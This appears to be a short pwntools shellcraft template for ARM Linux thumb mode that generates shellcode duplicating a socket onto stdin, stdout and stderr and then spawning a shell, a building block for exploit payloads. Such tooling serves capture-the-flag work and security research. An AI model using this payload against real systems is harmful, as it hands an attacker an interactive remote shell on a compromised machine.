<% from pwnlib.shellcraft import arm, common %>
<%page args="sock = 4"/>
<%docstring>
	Args: [sock (int/str) = (default: 4)]
	Duplicates sock to stdin, stdout and stderr and spawns a shell in thumb mode.
</%docstring>

${arm.linux.thumb_dup(sock)}

${arm.linux.thumb_sh()}
